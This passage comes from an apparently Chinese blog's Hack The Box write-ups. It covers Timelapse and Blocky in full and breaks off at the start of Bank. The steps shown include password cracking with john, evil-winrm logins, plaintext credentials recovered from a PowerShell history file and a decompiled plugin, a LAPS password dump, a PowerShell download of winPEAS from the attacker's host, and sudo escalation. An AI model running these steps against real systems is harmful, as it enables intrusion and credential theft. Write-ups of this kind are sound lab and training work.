[https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key\nEnter Import Password:\nMac verify error: invalid password?\n```\næå–æ—¶å‘ç°ä¹Ÿéœ€è¦å¯†ç ï¼Œä½¿ç”¨åˆšæ‰ zip çˆ†ç ´å‡ºæ¥çš„å¯†ç å°è¯•å¤±è´¥ï¼Œå†å»çˆ†ç ´ä¸€ä¸‹\n\n```bash\n    â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# pfx2john legacyy_dev_auth.pfx > hashbis \n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hashbis \nUsing default input encoding: UTF-8\nLoaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])\nCost 1 (iteration count) is 2000 for all loaded hashes\nCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nthuglegacy       (legacyy_dev_auth.pfx)     \n1g 0:00:01:58 DONE (2022-03-29 21:53) 0.008414g/s 27189p/s 27189c/s 27189C/s thuglife06..thug211\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\nçˆ†ç ´å‡ºæ¥å¯†ç  thuglegacyï¼Œç„¶åå†å»æå–ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -out prv.key          \nEnter Import Password:\nEnter PEM pass phrase:\nVerifying - Enter PEM pass phrase:\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt\nEnter Import Password:\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# ls\ncert.crt  hash  hashbis  legacyy_dev_auth.pfx  nmap  prv.key  winrm_backup.zip\n```\nä½¿ç”¨ evil-winrm è¿›è¡Œåˆ©ç”¨\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nWarning: SSL enabled\n\nInfo: Establishing connection to remote endpoint\n\nEnter PEM pass phrase:\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents> whoami\ntimelapse\\legacyy\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™\n\n```bash\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents> type 'C:\\Users\\legacyy\\Desktop\\user.txt'\n622218eb92f1c85ad186d6aee0dbdb53\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\nåœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ª HTTP æœåŠ¡\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# python3 -m http.server 80                                    \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\nä½¿ç”¨ powershell ä¸‹è½½æˆ‘ä»¬æœ¬åœ°çš„ winPEAS.exe è¾…åŠ©ææƒè„šæœ¬\n\n```bash\npowershell \"Invoke-WebRequest -UseBasicParsing 10.10.16.4/winPEASx64.exe -OutFile winPEASx64.exe\"\n```\nç„¶åè¿è¡Œ\n\n```bash\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents> powershell \"Invoke-WebRequest -UseBasicParsing 10.10.16.4/winPEASx64.exe -OutFile winPEASx64.exe\"\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents> ./winPEASx64.exe\n```\n```bash\nÃ‰ÃÃÃÃÃÃÃÃÃÃÂ¹ PowerShell Settings\n    PowerShell v2 Version: 2.0\n    PowerShell v5 Version: 5.1.17763.1\n    PowerShell Core Version: \n    Transcription Settings: \n    Module Logging Settings: \n    Scriptblock Logging Settings: \n    PS history file: C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n    PS history size: 434B\n```\nå‘ç°äº†ä¸€ä¸ªåŒ…å«å†å²å‘½ä»¤è®°å½•çš„æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥\n\n```bash\ndownload C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n```\nç„¶åæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# cat ConsoleHost_history.txt                                                                         \nwhoami\nipconfig /all\nnetstat -ano |select-string LIST\n$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck\n$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force\n$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)\ninvoke-command -computername localhost -credential $c -port 5986 -usessl -\nSessionOption $so -scriptblock {whoami}\nget-aduser -filter * -properties *\nexit\n```\nå°è¯•ä½¿ç”¨ laps.py æ¥è¿›è¡Œæ“ä½œ\n\n> [https://github.com/n00py/LAPSDumper/blob/main/laps.py](https://github.com/n00py/LAPSDumper/blob/main/laps.py)\n\né¦–å…ˆå°†æ·»åŠ ä¸€ä¸ªæœ¬åœ° DNS è§£æ\n\n```bash\necho 10.10.11.152 timelapse.htb >> /etc/hosts\n```\nç„¶åæ‰§è¡Œ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb\nDC01$:C9(3OIh923TK13J.iADjN))A\n```\næ‹¿åˆ°äº†ä¸€ä¸ªå¯†ç \n\nç»§ç»­ä½¿ç”¨ evil-winrm ç™»å½•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse]\nâ””â”€# evil-winrm -i 10.10.11.152 -S -u Administrator -p 'C9(3OIh923TK13J.iADjN))A' \n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nWarning: SSL enabled\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\ntimelapse\\administrator\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª administrator æƒé™\n\n```bash\n*Evil-WinRM* PS C:\\users\\TRX\\Desktop> cat root.txt\n365b8463a586a128c09558558d4deceb\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Blocky - Hackthebox","url":"/2022/03/31/Hackthebox/Easy/Hackthebox-Blocky/","content":"\n# Hackthebox - Blocky\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Blocky/c31330a6-fc78-4530-a275-fd8c53ba0249.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Blocky/ae3178d1-6c0e-493b-91ca-166879694505.png)\n\n# ä¿¡æ¯æœé›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Blocky]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.37\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 23:15 EDT\nNmap scan report for 10.10.10.37\nHost is up (0.46s latency).\nNot shown: 65530 filtered ports\nPORT      STATE  SERVICE   VERSION\n21/tcp    open   ftp       ProFTPD 1.3.5a\n22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)\n|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)\n|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)\n80/tcp    open   http      Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: WordPress 4.8\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: BlockyCraft â€“ Under Construction!\n8192/tcp  closed sophos\n25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)\nDevice type: general purpose|WAP|specialized|storage-misc|printer\nRunning (JUST GUESSING): Linux 3.X|4.X|2.6.X (94%), Asus embedded (90%), Crestron 2-Series (88%), HP embedded (88%)\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:3.4\nAggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.13 (93%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.12 (90%), Linux 3.18 (90%), Linux 3.2 - 4.9 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8192/tcp)\nHOP RTT       ADDRESS\n1   535.09 ms 10.10.16.1\n2   535.21 ms 10.10.10.37\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 163.96 seconds\n```\nè¿™å°æœ‰ç‚¹æ„æ€ï¼Œçœ‹èµ·æ¥åƒæ˜¯ Minectfatï¼ˆæˆ‘çš„ä¸–ç•Œï¼‰è¿™æ¬¾æ¸¸æˆçš„ä¸€å°æœåŠ¡å™¨\n\n## Http\n![](Hackthebox-Blocky/41a84187-1681-4020-9dda-b7ac2d985bb3.png)\n\nè¿™å°æœ‰ç‚¹æ„æ€çš„ï¼Œå¾€ä¸‹ç¿»å¯ä»¥çœ‹åˆ°æ˜¯ wordpress æ­å»ºçš„ï¼Œå»åšä¸ª wpscan\n\n## WPScan\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# wpscan --url http://10.10.10.37/\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ Â®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.17\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://10.10.10.37/ [10.10.10.37]\n[+] Started: Mon Mar 28 23:21:07 2022\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://10.10.10.37/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).\n | Found By: Rss Generator (Passive Detection)\n |  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>\n |  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/\n | Last Updated: 2022-01-25T00:00:00.000Z\n | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt\n | [!] The version is out of date, the latest version is 2.9\n | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 1.3 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:20 <=====================================================================================================================================> (137 / 137) 100.00% Time: 00:00:20\n\n[i] No Config Backups Found.\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Mon Mar 28 23:21:31 2022\n[+] Requests Done: 139\n[+] Cached Requests: 37\n[+] Data Sent: 34.403 KB\n[+] Data Received: 19.875 KB\n[+] Memory used: 224.391 MB\n[+] Elapsed time: 00:00:23\n```\næ²¡çœ‹åˆ°ä»€ä¹ˆç‰¹åˆ«æ˜æ˜¾çš„å¯ç”¨çš„æ¼æ´ï¼Œå» fuzz ä¸€ä¸‹ç›®å½•çœ‹çœ‹\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.10.37/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.37/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nwp-includes             [Status: 301, Size: 316, Words: 20, Lines: 10]\nwp-content              [Status: 301, Size: 315, Words: 20, Lines: 10]\nplugins                 [Status: 301, Size: 312, Words: 20, Lines: 10]\nwp-admin                [Status: 301, Size: 313, Words: 20, Lines: 10]\njavascript              [Status: 301, Size: 315, Words: 20, Lines: 10]\nwiki                    [Status: 301, Size: 309, Words: 20, Lines: 10]\nphpmyadmin              [Status: 301, Size: 315, Words: 20, Lines: 10]\nserver-status           [Status: 403, Size: 299, Words: 22, Lines: 12]\n                        [Status: 200, Size: 52256, Words: 3306, Lines: 314]\n:: Progress: [20116/20116] :: Job [1/1] :: 70 req/sec :: Duration: [0:12:10] :: Errors: 6 ::\n```\næœ‰ä¸€ä¸ª phpmyadmin ç›®å½•ï¼Œå»å°è¯•ä¸€ä¸‹\n\n![](Hackthebox-Blocky/53fe3cb9-feec-4e0a-a318-9fc458b8a1fe.png)\n\nä½¿ç”¨é»˜è®¤å£ä»¤ç™»å½•å¤±è´¥\n\n# æ¼æ´åˆ©ç”¨\n## æ¼æ´å‘ç°\nç„¶åçœ‹åˆ°æœ‰ä¸€ä¸ª plugins ç›®å½•ï¼Œå»çœ‹çœ‹æ’ä»¶\n\n![](Hackthebox-Blocky/98f1bc6d-53ba-43e7-8571-8d41e0394df9.png)\n\nè¿™é‡Œæœ‰ä¸€ä¸ª BlockyCore.jar ä¸‹è½½ä¸‹æ¥çœ‹çœ‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Blocky/BlockyCore]\nâ””â”€# ls\nBlockyCore.jar\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Blocky/BlockyCore]\nâ””â”€# unzip BlockyCore.jar\nArchive:  BlockyCore.jar\n  inflating: META-INF/MANIFEST.MF    \n  inflating: com/myfirstplugin/BlockyCore.class  \n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Blocky/BlockyCore]\nâ””â”€# ls\nBlockyCore.jar  com  META-INF\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Blocky/BlockyCore]\nâ””â”€# cd com                   \n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/Easy/Blocky/BlockyCore/com]\nâ””â”€# ls -la\næ€»ç”¨é‡ 12\ndrwxr-xr-x 3 root root 4096  3æœˆ 29 00:25 .\ndrwxr-xr-x 4 root root 4096  3æœˆ 29 00:25 ..\ndrwxr-xr-x 2 root root 4096  3æœˆ 29 00:25 myfirstplugin\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/Easy/Blocky/BlockyCore/com]\nâ””â”€# cd myfirstplugin   \n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/Blocky/BlockyCore/com/myfirstplugin]\nâ””â”€# ls -la\næ€»ç”¨é‡ 12\ndrwxr-xr-x 2 root root 4096  3æœˆ 29 00:25 .\ndrwxr-xr-x 3 root root 4096  3æœˆ 29 00:25 ..\n-rw-r--r-- 1 root root  939  7æœˆ  2  2017 BlockyCore.class\n```\nè§£å‹å‡ºæ¥äº†ï¼Œå»ä½¿ç”¨ java çš„åç¼–è¯‘å™¨ jd-gui æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\napt install jd-gui\n```\nå®‰è£… jd-gui\n\n![](Hackthebox-Blocky/6aeabe89-19dd-4353-a060-64b3329b2dc7.png)\n\n```bash\npackage com.myfirstplugin;\n\npublic class BlockyCore {\n  public String sqlHost = \"localhost\";\n\n  public String sqlUser = \"root\";\n\n  public String sqlPass = \"8YsqfCTnvxAUeduzjNSXe22\";\n\n  public void onServerStart() {}\n\n  public void onServerStop() {}\n\n  public void onPlayerJoin() {\n    sendMessage(\"TODO get username\", \"Welcome to the BlockyCraft!!!!!!!\");\n  }\n\n  public void sendMessage(String username, String message) {}\n}\n```\nä½¿ç”¨ jd-gui æ‰“å¼€ BlockyCore.class åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª sql çš„è´¦å·å’Œå¯†ç \n\næ­£å¥½æˆ‘ä»¬æœ‰ phpmyadmin å»ç™»é™†ä¸€ä¸‹\n\n![](Hackthebox-Blocky/c57c59ba-643b-4b47-87f2-b0e3e0d59894.png)\n\nç™»å½•æˆåŠŸ\n\næ—¢ç„¶è¿™ä¸ªè´¦å·å¯ä»¥ç™»å½• sql æ•°æ®åº“ï¼Œé‚£è¯æ˜è‚¯å®šæ˜¯ä¸€ä¸ªç³»ç»Ÿè´¦æˆ·ï¼Œé‚£æˆ‘ä»¬æ˜¯å¦å¯ç”¨è¿™ä¸ªç³»ç»Ÿè´¦æˆ·è¿›è¡Œç™»å½• ssh å‘¢ï¼Ÿå»å°è¯•ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh root@10.10.10.37                                           \nThe authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.\nECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.37' (ECDSA) to the list of known hosts.\nroot@10.10.10.37's password: \nPermission denied, please try again.\nroot@10.10.10.37's password: \nPermission denied, please try again.\nroot@10.10.10.37's password:\n```\nç™»å½•å¤±è´¥äº†ï¼Œé‚£æ˜¯å¦æ˜¯å…¶ä»–è´¦å·çš„å‘¢ï¼Ÿæˆ‘ä»¬ç›®å‰ä¹Ÿæ²¡æœ‰å…¶ä»–è´¦å·ï¼Œå»è·å–ä¸€ä¸‹\n\n## è´¦å·è·å–\n![](Hackthebox-Blocky/f6636e40-9f90-4ade-bf9d-ec295cba812c.png)\n\né¦–å…ˆå¯ä»¥çœ‹åˆ°å”¯ä¸€ä¸€ç¯‡æ–‡ç« çš„å‘å¸ƒäººæ˜¯ NOTCHï¼ˆMinecraft è¿™æ¬¾æ¸¸æˆçš„åˆ›å§‹äººï¼‰\n\né‚£ä»–å¾ˆå¯èƒ½å°±æ˜¯ä¸€ä¸ªè´¦å·ï¼ŒåŒæ—¶æˆ‘ä»¬å»æ•°æ®åº“å†…ä¹Ÿçœ‹ä¸€ä¸‹\n\n![](Hackthebox-Blocky/ce9c4053-514e-45fc-bf3d-8ad04af879fa.png)\n\nåœ¨æ•°æ®åº“å†…ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œåªæœ‰ NOTCH è¿™ä¸€ä¸ªè´¦å·ï¼Œæˆ‘æƒ³åº”è¯¥å°±æ˜¯äº†ï¼Œå»å°è¯•ä¸€ä¸‹å§\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh notch@10.10.10.37                                                                                                                                                                                     130 â¨¯\nnotch@10.10.10.37's password: \nWelcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n7 packages can be updated.\n7 updates are security updates.\n\nLast login: Sun Dec 24 09:34:35 2017\nnotch@Blocky:~$ whoami&&id\nnotch\nuid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)\n```\nç™»å½•æˆåŠŸ\n\n```bash\nnotch@Blocky:~$ cat user.txt \n59fee0977fb60b8a0bc6e41e751f3cd5\n```\næˆåŠŸè·å¾— user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\nnotch@Blocky:~$ sudo -l\n[sudo] password for notch: \nMatching Defaults entries for notch on Blocky:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser notch may run the following commands on Blocky:\n    (ALL : ALL) ALL\n```\næŸ¥çœ‹ä¸€ä¸‹ sudo -lï¼Œæˆ‘ä»¬çš„ NOTCH è´¦æˆ·æ‹¥æœ‰æ‰€æœ‰æƒé™ï¼Œé‚£ç›´æ¥ææƒå§\n\n```bash\nnotch@Blocky:~$ sudo su\nroot@Blocky:/home/notch# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\nroot@Blocky:/home/notch# cat /root/root.txt \n0a9694a5b4d272c694679f7860f1cd5f\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Bank - Hackthebox","url":"/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/","content":"\n# Hackthebox - Bank\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Bank/9389a965-ea28-4096-a234-c29cd50f0674.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Bank/06b06f3b-8f61-467f-90ab-5d23d93c8e5f.png)\n\n# ä¿¡æ¯æœé›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Bank]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.29\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 01:51 EDT\nNmap scan report for 10.10.10.29\nHost is up (0.53s latency).\nNot shown: 63750 filtered ports, 1782 closed ports\nPORT   STATE SERVICE    VERSION\n22/tcp open  tcpwrapped\n| ssh-hostkey: \n|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)\n|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)\n|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)\n|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)\n53/tcp open  tcpwrapped\n| dns-nsid: \n|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu\n80/tcp open  tcpwrapped\n|_http-server-header: Apache/2.4.7 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=3/28%OT=80%CT=7%CU=30511%PV=Y%DS=2%DC=T%G=Y%TM=62414DA\nOS:A%P=x86_64-pc-linux-gnu)SEQ(CI=I)SEQ(SP=105%GCD=1%ISR=107%TI=Z%II=I%TS=8\nOS:)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(O1=M54BST11NW7%O2=M54B\nOS:ST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1\nOS:=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%TG=40%W=7210%\nOS:O=M54BNNSNW7%CC=Y%Q=)ECN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=\nOS:Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q\nOS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y\nOS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%\nOS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%\nOS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T\nOS:7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A\nOS:=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI\nOS:PCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 143/tcp)\nHOP RTT       ADDRESS\n1   991.53 ms 10.10.16.1\n2   233.51 ms 10.10.10.29\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 190.30 seconds\n```\n## Http\n![](Hackthebox-Bank/b1df3f12-10a7-49e8-91e7-8ee608a37d0c.png)\n\nç›´æ¥è®¿é—® ip åœ°å€ï¼Œä¼šè¿›å…¥ apache çš„é»˜è®¤é¡µé¢ï¼ŒåŒæ—¶æˆ‘ä»¬çœ‹åˆ° 53 ç«¯å£æ‰“å¼€ç€ï¼Œå¾ˆå…¸å‹çš„ DNS æœåŠ¡å™¨ï¼Œæ·»åŠ ä¸€ä¸ªè§£æ\n\n```bash\necho 